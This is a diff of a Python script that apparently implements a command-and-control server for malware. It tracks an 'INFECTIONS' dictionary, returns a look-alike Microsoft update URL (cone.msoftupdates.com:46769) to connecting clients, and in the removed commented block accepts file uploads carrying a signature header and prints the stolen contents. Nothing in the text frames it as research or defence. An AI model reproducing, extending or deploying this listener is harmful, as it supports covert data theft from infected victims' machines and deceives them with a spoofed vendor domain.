@@ -1,73 +1,13 @@
-# import socket
-# import re
-
-# PORT = 46769
-# BUFFER_SIZE = 65536
-
-# def handle_client_connection(client_socket):
-
-#     data = client_socket.recv(BUFFER_SIZE)
-#     print()
-#     print(data)
-#     headers, content = data.split(b'\r\n\r\n', 1)
-    
-#     if b"POST" in headers:
-#         if b"SIGNATUREHASH=" not in headers:
-#             response =  b'HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nAdded'
-#             client_socket.send(response)
-#             client_socket.close()
-#         else:
-#             data = client_socket.recv(BUFFER_SIZE)
-#             print("ADDITION")
-#             print(data)
-#             content_type = re.search(b'Content-Type: (.+)', headers).group(1)
-#             boundary = content_type.split(b'=')[1]
-#             file_data_start = content.find(b'\r\n\r\n') + 4
-#             file_data_end = content.rfind(b'--' + boundary) - 2
-            
-#             file_data = content[file_data_start:file_data_end]
-#             print("FILE DATA")
-#             print(file_data.decode('utf-8'))
-            
-            
-#             response =  b'HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nAdded'
-#             client_socket.send(response)
-#             client_socket.close()
-#     else:      
-#         response =  b'HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nhttp://cone.msoftupdates.com:46769'
-#         client_socket.send(response)
-    
-#     client_socket.close()
-    
-
-# server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-# server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-# server_socket.bind(("", PORT))
-# server_socket.listen(1)
-
-# try:
-#     while True:
-#         client_socket, addr = server_socket.accept()
-#         handle_client_connection(client_socket)
-# except KeyboardInterrupt:
-#     pass
-    
-# server_socket.close()
-
-
-
-
-
 import threading
-import http.client
 import urllib.parse
-from http import HTTPStatus
 from http.server import SimpleHTTPRequestHandler, HTTPServer
 
 PORT = 46769
 server_running = True
 
+
 INFECTIONS = {}
+
 
 class CustomRequestHandler(SimpleHTTPRequestHandler):
 
@@ -83,14 +23,6 @@ class CustomRequestHandler(SimpleHTTPRequestHandler):
             self.send_header("Content-type", "text/plain")
             self.end_headers()
             self.wfile.write(b"http://cone.msoftupdates.com:46769")
-
-        # elif self.path == '/hello':
-        #     self.send_response(200)
-        #     self.send_header("Content-type", "text/plain")
-        #     self.end_headers()
-        #     self.wfile.write(b"Hello from the /hello path!")
-        # else:
-        #     self.send_error(404, "Not Found")
         
         print()
         print()
@@ -157,6 +89,8 @@ httpd = CustomHTTPServer(("", PORT), Handler)
 
 server_thread = threading.Thread(target=run_server, args=(httpd,))
 server_thread.start()
+
+
 
 try:
     while server_running:
